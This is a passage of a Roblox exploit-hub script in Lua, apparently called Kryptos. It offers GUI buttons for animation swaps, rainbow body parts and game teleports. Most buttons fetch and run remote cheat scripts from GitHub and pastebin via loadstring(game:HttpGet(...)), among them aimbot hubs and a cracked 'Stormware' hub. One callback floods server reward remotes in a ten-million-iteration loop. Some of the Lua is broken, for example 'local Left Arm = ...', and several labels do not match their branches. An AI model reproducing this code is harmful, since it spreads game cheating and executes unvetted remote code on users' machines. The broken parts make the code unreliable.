		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=707826056"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=707829716"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "Ninja [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=656121766"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=656118852"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=656117878"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=656114359"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=656115606"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})



CharacterTab:AddButton({
	Name = "Pirate [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=750785693"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=750783738"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=750782230"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=750779899"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=750780242"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "Robot [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616095330"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616091570"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616090535"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616086039"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616087089"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "Stylish [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616146177"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616140816"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616139451"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616133594"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616134815"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "SuperHero [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616122287"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616117076"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616115533"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616104706"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616108001"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "Toy [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=782843345"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=782842708"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=782847020"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=782843869"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=782846423"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "Vampire [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=1083473930"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=1083462077"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=1083455352"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=1083439238"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=1083443587"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "Werewolf [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=1083178339"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=1083216690"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=1083218792"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=1083182000"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=1083189019"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "Oldschool [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=5319828216"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=5319831086"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=5319847204"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=5319844329"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=5319841935"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=5319816685"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=5319839762"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})

-- VisualWorks (Hats GUI...) -- 
local Section = CharacterTab:AddSection({
	Name = "Other Hats/Accessories"
})


CharacterTab:AddButton({
	Name = "VisualWorks (Hats/Accessories GUI) (NW)",
	Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ForestIsPro/VisualWorks/main/FreeHats'))()
  	end    
})

local Section = CharacterTab:AddSection({
	Name = "Rainbow Body Parts"
})


CharacterTab:AddButton({
	Name = "Rainbow Head [R15 & R6]",
	Callback = function()
    -- Head
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    local Head = chr.Head
    while wait(0.1) do 
	Head.BrickColor = BrickColor.random() 
end
  	end    
})


CharacterTab:AddButton({
	Name = "Rainbow Left Arm [R15 Only]",
	Callback = function()
    -- Left Arm
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    local LeftUpperArm = chr.LeftUpperArm
    while wait(0.1) do 
	LeftUpperArm.BrickColor = BrickColor.random() 
end
  	end    
})


CharacterTab:AddButton({
	Name = "Rainbow Right Arm [R15 Only]",
	Callback = function()
    -- Right Arm
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    local RightUpperArm = chr.RightUpperArm
    while wait(0.1) do 
	RightUpperArm.BrickColor = BrickColor.random() 
end
  	end    
})


CharacterTab:AddButton({
	Name = "Rainbow Torso [R15 Only]",
	Callback = function()
    -- Right Leg
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    local UpperTorso = chr.UpperTorso
    while wait(0.1) do 
	UpperTorso.BrickColor = BrickColor.random() 
end
  	end    
})


CharacterTab:AddButton({
	Name = "Rainbow Left Leg [R15 Only]",
	Callback = function()
    -- Left Leg
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    local LeftUpperLeg = chr.LeftUpperLeg
    while wait(0.1) do 
	LeftUpperLeg.BrickColor = BrickColor.random() 
end
  	end    
})


CharacterTab:AddButton({
	Name = "Rainbow Right Leg [R15 Only]",
	Callback = function()
    -- Right Leg
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    local RightUpperLeg = chr.RightUpperLeg
    while wait(0.1) do 
	RightUpperLeg.BrickColor = BrickColor.random() 
end
  	end    
})


local Section = CharacterTab:AddSection({
	Name = "R6 Rainbow Body"
})


CharacterTab:AddButton({
	Name = "Rainbow Head [R15 & R6]",
	Callback = function()
    -- Head
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    local Head = chr.Head
    while wait(0.1) do 
	Head.BrickColor = BrickColor.random() 
end
  	end    
})


CharacterTab:AddButton({
	Name = "Rainbow Left Arm [R6 Only]",
	Callback = function()
    -- Left Arm
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    local Left Arm = chr["Left Arm"]
    while wait(0.1) do
	local Left Arm.BrickColor = BrickColor.random() 
end
  	end    
})


CharacterTab:AddButton({
	Name = "Rainbow Right Arm [R6 Only]",
	Callback = function()
    -- Right Arm
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    local Right Arm = chr["Right Arm"]
    while wait(0.1) do
	local Right Arm.BrickColor = BrickColor.random() 
end
  	end    
})


CharacterTab:AddButton({
	Name = "Rainbow Torso [R15 & R6]",
	Callback = function()
    -- Torso
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    local Torso = chr.Torso
    while wait(0.1) do 
	Torso.BrickColor = BrickColor.random() 
end
  	end    
})


CharacterTab:AddButton({
	Name = "Rainbow Left Leg [R6 Only]",
	Callback = function()
    -- Right Leg
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    local Left Leg = chr["Left Leg"]
    while wait(0.1) do
	local Left Leg.BrickColor = BrickColor.random() 
end
  	end    
})


CharacterTab:AddButton({
	Name = "Rainbow Right Leg [R6 Only]",
	Callback = function()
    -- Right Leg
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    local Right Leg = chr["Right Leg"]
    while wait(0.1) do
	local Right Leg.BrickColor = BrickColor.random() 
end
  	end    
})

--[] Kryptos | Animation

AnimationTab:AddParagraph("IMPORTANT","Some animations wont work since its outdated or your executor!")

AnimationTab:AddButton({
	Name = "Animation Player",
	Callback = function()
		loadstring(game:HttpGet("https://github.com/yayeet-creator/nameless-r6-scripts/raw/main/%5BFE%5D%20Animation%20ID%20Player.txt"))()
	end
})

--[] Seperator
local Section = AnimationTab:AddSection({
	Name = "Universal Animation R6/R15"
})
--[] Seperator

AnimationTab:AddButton({
	Name = "Energize Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua"))()
	end
})

AnimationTab:AddButton({
	Name = "Pendulum Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua"))()
	end
})

AnimationTab:AddButton({
	Name = "Novole Animation Hub",
	Callback = function()
	  loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/AnimationScripts/main/FE_Novole_Animation_Gui.lua'))()
	end
})

AnimationTab:AddButton({
	Name = "LX63 Animation Hub",
	Callback = function()
	  loadstring(game:HttpGet(('https://raw.githubusercontent.com/Gogogamer61/LXHub-Main/main/LXHub%20Main%20Script'),true))()
	end
})

AnimationTab:AddButton({
	Name = "Animation Changer 1",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/RubyBoo4life/Scripts/main/animations.vis'))()"))()
	end
})


AnimationTab:AddButton({
	Name = "Animation Changer 2",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/UniversalDance-AnimGui.lua'))()
	end
})

--[] Seperator
local Section = AnimationTab:AddSection({
	Name = "Animation Hubs"
})
--[] Seperator

AnimationTab:AddButton({
	Name = "Animation Hub",
	Callback = function()
	  loadstring(game:HttpGet('https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/UFE'))()
	end
})

--[] Seperator
local Section = AnimationTab:AddSection({
	Name = "Animation GUI"
})
--[] Seperator

AnimationTab:AddButton({
	Name = "Animation GUI 1",
	Callback = function()
	  loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/AnimationScripts/main/FE_Animation_Gui.lua'))()
	end
})

AnimationTab:AddButton({
	Name = "Animation GUI 2",
	Callback = function()
	  loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/AnimationScripts/main/FE_Animations_Gui_1.lua'))()
	end
})

AnimationTab:AddButton({
	Name = "Animation GUI 2",
	Callback = function()
	  loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/AnimationScripts/main/FE_Animations_Gui_2.lua'))()
	end
})

local Section = AnimationTab:AddSection({
	Name = "R6 Animations"
})


AnimationTab:AddButton({
	Name = "Winged Master [R6 Only]",
	Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/wingedmaster/main/source'))()
  	end    
})


AnimationTab:AddButton({
	Name = "Parkour V2 [R6 Only]",
	Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/parkourv2/main/source'))()
  	end    
})


AnimationTab:AddButton({
	Name = "Default [R6 Only]",
	Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/defaultdance/main/source'))()
  	end    
})


AnimationTab:AddButton({
	Name = "Da Feets [R6 Only]",
	Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/dafeets/main/source'))()
  	end    
})


AnimationTab:AddButton({
	Name = "Rickroll [R6 Only]",
	Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/rickroll/main/source', true))()
  	end    
})


AnimationTab:AddButton({
	Name = "Human Car [R6 Only]",
	Callback = function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/humancar/main/source', true))()
  	end    
})


local Section = AnimationTab:AddSection({
	Name = "R15 Animations"
})


AnimationTab:AddButton({
	Name = "Breakdance [R15 Only]",
	Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/KRNL2/r15breakdance/main/source', true))()
  	end    
})


local Section = AnimationTab:AddSection({
	Name = "R15 & R6 Animations"
})


AnimationTab:AddButton({
	Name = "FrontFlip & BackFlip [R15 & R6]",
	Callback = function()
	wait(5)

--[[ Info ]]--

local ver = "2.00"
local scriptname = "feFlip"


--[[ Keybinds ]]--

local FrontflipKey = Enum.KeyCode.Z
local BackflipKey = Enum.KeyCode.X
local AirjumpKey = Enum.KeyCode.C


--[[ Dependencies ]]--

local ca = game:GetService("ContextActionService")
local zeezy = game:GetService("Players").LocalPlayer
local h = 0.0174533
local antigrav


--[[ Functions ]]--

function zeezyFrontflip(act,inp,obj)
	if inp == Enum.UserInputState.Begin then
		zeezy.Character.Humanoid:ChangeState("Jumping")
		wait()
		zeezy.Character.Humanoid.Sit = true
		for i = 1,360 do 
			delay(i/720,function()
			zeezy.Character.Humanoid.Sit = true
				zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(-h,0,0)
			end)
		end
		wait(0.55)
		zeezy.Character.Humanoid.Sit = false
	end
end

function zeezyBackflip(act,inp,obj)
	if inp == Enum.UserInputState.Begin then
		zeezy.Character.Humanoid:ChangeState("Jumping")
		wait()
		zeezy.Character.Humanoid.Sit = true
		for i = 1,360 do
			delay(i/720,function()
			zeezy.Character.Humanoid.Sit = true
				zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(h,0,0)
			end)
		end
		wait(0.55)
		zeezy.Character.Humanoid.Sit = false
	end
end

function zeezyAirjump(act,inp,obj)
	if inp == Enum.UserInputState.Begin then
		zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Seated")
		wait()
		zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")	
	end
end


--[[ Binds ]]--

ca:BindAction("zeezyFrontflip",zeezyFrontflip,false,FrontflipKey)
ca:BindAction("zeezyBackflip",zeezyBackflip,false,BackflipKey)
ca:BindAction("zeezyAirjump",zeezyAirjump,false,AirjumpKey)

--[[ Load Message ]]--

print(scriptname .. " " .. ver .. " loaded successfully")
print("made by Zeezy#7203")

local notifSound = Instance.new("Sound",workspace)
notifSound.PlaybackSpeed = 1.5
notifSound.Volume = 0.15
notifSound.SoundId = "rbxassetid://170765130"
notifSound.PlayOnRemove = true
notifSound:Destroy()
game.StarterGui:SetCore("SendNotification", {Title = "feFlip", Text = "feFlip loaded successfully!", Icon = "rbxassetid://505845268", Duration = 5, Button1 = "Okay"})
  	end    
})


AnimationTab:AddButton({
	Name = "Hamster Ball [R15 & R6]",
	Callback = function()
    local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

local SPEED_MULTIPLIER = 30
local JUMP_POWER = 60
local JUMP_GAP = 0.3

local character = game.Players.LocalPlayer.Character

for i,v in ipairs(character:GetDescendants()) do
   if v:IsA("BasePart") then
       v.CanCollide = false
   end
end

local ball = character.HumanoidRootPart
ball.Shape = Enum.PartType.Ball
ball.Size = Vector3.new(5,5,5)
local humanoid = character:WaitForChild("Humanoid")
local params = RaycastParams.new()
params.FilterType = Enum.RaycastFilterType.Blacklist
params.FilterDescendantsInstances = {character}

local tc = RunService.RenderStepped:Connect(function(delta)
   ball.CanCollide = true
   humanoid.PlatformStand = true
if UserInputService:GetFocusedTextBox() then return end
if UserInputService:IsKeyDown("W") then
ball.RotVelocity -= Camera.CFrame.RightVector * delta * SPEED_MULTIPLIER
end
if UserInputService:IsKeyDown("A") then
ball.RotVelocity -= Camera.CFrame.LookVector * delta * SPEED_MULTIPLIER
end
if UserInputService:IsKeyDown("S") then
ball.RotVelocity += Camera.CFrame.RightVector * delta * SPEED_MULTIPLIER
end
if UserInputService:IsKeyDown("D") then
ball.RotVelocity += Camera.CFrame.LookVector * delta * SPEED_MULTIPLIER
end
--ball.RotVelocity = ball.RotVelocity - Vector3.new(0,ball.RotVelocity.Y/50,0)
end)

UserInputService.JumpRequest:Connect(function()
local result = workspace:Raycast(
ball.Position,
Vector3.new(
0,
-((ball.Size.Y/2)+JUMP_GAP),
0
),
params
)
if result then
ball.Velocity = ball.Velocity + Vector3.new(0,JUMP_POWER,0)
end
end)

Camera.CameraSubject = ball
humanoid.Died:Connect(function() tc:Disconnect() end)
  	end    
})




--[] Kryptos | Game

GameHubTab:AddParagraph("NOTE","Still adding more please wait!")

local games = {
    ["A Dusty Trip"] = 16389395869,
    ["Arsenal"] = 286090429,
    ["Ability Wars"] = 8260276694,
    ["Animal Speed Race"] = 17434340300,
    ["Anime Fighters Simulator"] = 6299805723,
    ["Animal Race"] = 17360443692,
    ["Apocalypse Rising 2"] = 863266079,
    ["Blade Ball"] = 13772394625,
    ["Bedwars"] = 6872265039,
    ["Build a Boat"] = 537413528,
    ["Blox fruit"] = 2753915549,
    ["Bee swarm Simulator"] = 1537690962,
    ["Boxing league"] = 3738091713,
    ["Breaking point"] = 648362523,
    ["Bad Business"] = 3233893879,
    ["Basketball Legends"] = 14259168147,
    ["Combat warriors"] = 4282985734,
    ["Counter Blox"] = 301549746,
    ["Criminality"] = 4588604953,
    ["Da Hood"] = 2788229376,
    ["Doors"] = 6516141723,
    ["Driving empire"] = 3351674303,
    ["Drive world"] = 10704789056,
    ["Evade"] = 9872472334,
    ["Fling things and People"] = 6961824067,
    ["Frontlines"] = 5938036553,
    ["Fights in School"] = 17698425045,
    ["Godswill"] = 12826178482,
    ["Gym league"] = 17450551531,
    ["Horrific Housing"] = 26263761432,
    ["Heroes Battleground"] = 13076380114,
    ["Hoopz"] = 6229116934,
    ["Item asylum"] = 5670218884,
    ["Jujutsu Shenanigans"] = 9391468976,
    ["Jail Break"] = 6068606849621,
    ["KAT"] = 621129760,
    ["Launch into Space Simulator"] = 15535115259,
    ["Lumber tycoon 2"] = 13822889,
    ["Lucky Block"] = 662417684,
    ["Murder mystery 2"] = 142823291,
    ["Murderer vs Sheriff"] = 12355337193,
    ["Murderer vs Sheriff Duels"] = 12355337193,
    ["Mic up"] = 6884319169,
    ["Muscle legends"] = 3623096087,
    ["Natural disaster"] = 189707,
    ["Project Slayer"] = 5956785391,
    ["Prison Life"] = 5956785391,
    ["Pls DONATE"] = 8737602449,
    ["Rivals"] = 17625359962,
    ["Rush Point"] = 5993942214,
    ["Ro Ghoul"] = 914010731,
    ["Steal Time From Others"] = 10191847911,
    ["Sol's RNG"] = 15532962292,
    ["Shinobi STORM"] = 4585085581,
    ["Scythe Simulator"] = 17524285289,
    ["Scp 3008"] = 2768379856,
    ["Slap Battles"] = 6403373529,
    ["Sky Wars"] = 8542259458,
    ["The Strongest Battleground"] = 10449761463,
    ["Pet Simulator 99"] = 8737899170
}

GameHubTab:AddDropdown({
    Name = "Game Teleporter",
    Default = "None",
    Options = {
        "None", 
        "A Dusty Trip", 
        "Arsenal", 
        "Ability Wars", 
        "Animal Speed Race", 
        "Anime Fighters Simulator", 
        "Animal Race",
        "Apocalypse Rising 2",
        "Blade Ball",
        "Bedwars",
        "Build a Boat",
        "Blox fruit",
        "Bee swarm Simulator",
        "Boxing league",
        "Breaking point",
        "Bad Business",
        "Basketball Legends",
        "Combat warriors",
        "Counter Blox",
        "Criminality",
        "Da Hood",
        "Doors",
        "Driving empire",
        "Drive world",
        "Evade",
        "Fling things and People",
        "Frontlines",
        "Fights in School",
        "Godswill",
        "Gym league",
        "Horrific Housing",
        "Heroes Battleground",
        "Hoopz",
        "Item asylum",
        "Jujutsu Shenanigans",
        "Jail Break",
        "KAT",
        "Launch into Space Simulator",
        "Lumber tycoon 2",
        "Lucky Block",
        "Murder mystery 2",
        "Murderer vs Sheriff",
        "Murderer vs Sheriff Duels",
        "Mic up",
        "Muscle legends",
        "Natural disaster",
        "Project Slayer",
        "Prison Life",
        "Pls DONATE",
        "Rivals",
        "Rush Point",
        "Ro Ghoul",
        "Steal Time From Others",
        "Sol's RNG",
        "Shinobi STORM",
        "Scythe Simulator",
        "Scp 3008",
        "Slap Battles",
        "Sky Wars",
        "The Strongest Battleground",
        "Pet Simulator 99"
    },
    Callback = function(Value)
        if Value == "None" then
            print("")
        else
            local gameId = games[Value]
            if gameId then
                game:GetService("TeleportService"):Teleport(gameId, game.Players.LocalPlayer)
            else
                print("Game not found")
            end
        end
    end
})

--[] Seperator
local Section = GameHubTab:AddSection({
	Name = ""
})
--[] Seperator

GameHubTab:AddDropdown({
	Name = "A Dusty Trip",
	Default = "None",
	Options = {
	  "None", 
	  "Click to join",
	  "Erudite HUB",
	  "Lighux HUB",
	  "Zygarde HUB",
	  "LH HUB",
	  "Connect HUB"
	},
	Callback = function(Value)
		if Value == "None" then
		  print("")
		elseif Value == "Click to join" then
		  game:GetService("TeleportService"):Teleport(16389395869, game.Players.LocalPlayer)
		elseif Value == "Connect HUB" then
		 loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/dusty/main/trip"))()
		elseif Value == "Erudite HUB" then
		  loadstring(game:HttpGet("https://raw.githubusercontent.com/ThacG/EruditeHub/main/A%20Dusty%20Trip/V3"))()
		elseif Value == "Lighux HUB" then
		 loadstring(game:HttpGet(('https://raw.githubusercontent.com/cool83birdcarfly02six/Lightux/main/README.md'),true))()
		elseif Value == "LH HUB" then
		  loadstring(game:HttpGet("https://raw.githubusercontent.com/louismich4el/Zygarde/main/Protected%20zygarde.lua"))()
		elseif Value == "Zygarde HUB" then
		  loadstring(game:HttpGet("https://raw.githubusercontent.com/louismich4el/Zygarde/main/Protected%20zygarde.lua"))()
		end
	end    
})

GameHubTab:AddDropdown({
	Name = "Arsenal",
	Default = "None",
	Options = {
	  "None", 
	  "Click to join",
	  "Kova HUB",
	  "Thunder HUB",
	  "Air HUB",
	  "Cas HUB",
	  "Leg HUB",
	  "Tanqr HUB",
	  "Stormware HUB",
	  "Midnight.cc HUB",
	  "Hoho HUB",
	  "Tect HUB"
	},
	Callback = function(Value)
		if Value == "None" then
		  print("")
		elseif Value == "Click to join" then
		  	game:GetService("TeleportService"):Teleport(286090429, game.Players.LocalPlayer)
		elseif Value == "Kova HUB" then
		 loadstring(game:HttpGet("https://raw.githubusercontent.com/blix200/kowa-hub/main/kowamain"))()
		elseif Value == "Thunder HUB" then
		  lrm_load_script("dc0fbd1b55234bbd14c5485d574ee722")
		elseif Value == "Air HUB" then
		 loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/AirHub/main/AirHub.lua"))()
		elseif Value == "Cas HUB" then
		  loadstring(game:HttpGet("https://raw.githubusercontent.com/cris123452/my/main/cas",true))()
		elseif Value == "QP HUB" then
		  loadstring(game:HttpGet("https://raw.githubusercontent.com/QPScript/Script/main/Arsenal.txt"))()
		elseif Value == "Leg HUB" then
		  loadstring(game:HttpGet("https://pastebin.com/raw/G6Ubkkuv"))()
		elseif Value == "Tanqr HUB" then
		  loadstring(game:HttpGet("https://pastebin.com/raw/mXQLj82U"))()
		elseif Value == "Stormware HUB" then
		  loadstring(game:HttpGet("https://raw.githubusercontent.com/QP-Community/Roblox-Exploit/main/Stormware_Crack"))()
		elseif Value == "Midnight.cc HUB" then
		  loadstring(game:HttpGet("https://raw.githubusercontent.com/laeraz/midnightcc/main/public.lua"))()
		elseif Value == "Hoho HUB" then
		  loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
		elseif Value == "Tect HUB" then
		  loadstring(game:HttpGet("https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Arsenalscript.txt"))()
		end
	end    
})

GameHubTab:AddDropdown({
	Name = "Ability Wars",
	Default = "None",
	Options = {
	  "None", 
	  "Click to join",
	  "Script-Master HUB"
	},
	Callback = function(Value)
		if Value == "None" then
		  print("")
		elseif Value == "Click to join" then
		  game:GetService("TeleportService"):Teleport(8260276694, game.Players.LocalPlayer)
		elseif Value == "Script-Master HUB" then
		 loadstring(game:HttpGet("https://raw.githubusercontent.com/TheScriptMaster1/ScriptMaster-Hub/main/AbilityWars.lua",true))()
		end
	end    
})

GameHubTab:AddDropdown({
	Name = "Animal Speed Race",
	Default = "None",
	Options = {
	  "None", 
	  "Click to join",
	  "Anime Speed Race HUB"
	},
	Callback = function(Value)
		if Value == "None" then
		  print("")
		elseif Value == "Click to join" then
	   	game:GetService("TeleportService"):Teleport(17434340300, game.Players.LocalPlayer)
		elseif Value == "Animal Speed Race HUB" then
		 loadstring(game:HttpGet(("https://raw.githubusercontent.com/AppleScript001/Anime_Speed_Race_GUI/main/README.md"),true))()
		end
	end    
})

GameHubTab:AddDropdown({
	Name = "Animal Race",
	Default = "None",
	Options = {
	  "None", 
	  "Click to join",
	  "Rejoin if you want to stop"
	},
	Callback = function(Value)
		if Value == "None" then
		  print("")
		elseif Value == "Click to join" then
		  game:GetService("TeleportService"):Teleport(17360443692, game.Players.LocalPlayer)
		elseif Value == "Rejoin if u want to stop" then
		 for i = 1, 10000000 do
    game:GetService("ReplicatedStorage").Remotes.Gifts.RequestSpinReward:InvokeServer()

    local ohString1 = "Desert"
    local ohNumber2 = 1

    game:GetService("ReplicatedStorage").Remotes.Race.AwardRace:FireServer(ohString1, ohNumber2)

    local ohString2 = "Castle"
    local ohNumber3 = 1

    game:GetService("ReplicatedStorage").Remotes.Race.AwardRace:FireServer(ohString2, ohNumber3)

    local ohString4 = "Sewer"
    local ohNumber5 = 1

    game:GetService("ReplicatedStorage").Remotes.Race.AwardRace:FireServer(ohString4, ohNumber5)

    local ohString6 = "Mars"
    local ohNumber7 = 1

    game:GetService("ReplicatedStorage").Remotes.Race.AwardRace:FireServer(ohString6, ohNumber7)

    local ohString8 = "Sea"
    local ohNumber9 = 1

    game:GetService("ReplicatedStorage").Remotes.Race.AwardRace:FireServer(ohString8, ohNumber9)
end
		end
	end    
})

